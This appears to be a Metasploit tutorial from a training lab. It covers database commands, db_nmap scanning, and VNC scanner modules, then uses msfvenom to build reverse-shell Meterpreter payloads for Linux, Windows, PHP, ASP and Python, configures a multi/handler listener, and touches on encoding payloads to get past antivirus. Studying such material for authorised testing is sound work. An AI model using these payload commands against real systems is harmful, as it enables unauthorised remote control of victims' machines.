Database Backend Commands
=========================

Command           Description
-------           -----------
analyze           Analyze database information about a specific address or address range
db_connect        Connect to an existing data service
db_disconnect     Disconnect from the current data service
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)

db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
db_remove         Remove the saved data service entry
db_save           Save the current data service connection as the default to reconnect on startup
db_status         Show the current data service status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces


If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database. 

The db_nmap command
msf6 > db_nmap -sV -p- 10.10.12.229
You can now reach information relevant to hosts and services running on target systems with the hosts and services commands, respectively. 

msf6 > use auxiliary/scanner/vnc/
use auxiliary/scanner/vnc/ard_root_pw    use auxiliary/scanner/vnc/vnc_login      use auxiliary/scanner/vnc/vnc_none_auth
msf6 > use auxiliary/scanner/vnc/

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats

Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.

Generating a
PHP


We will use Multi Handler to receive the incoming connection. The module can be used with the use exploit/multi/handler command.

Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values.

Setting up the listener
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port


Exploit target:

   0   Wildcard Target


msf6 exploit(multi/handler) >

Other Payloads


Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.

Linux Executable and Linkable Format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.
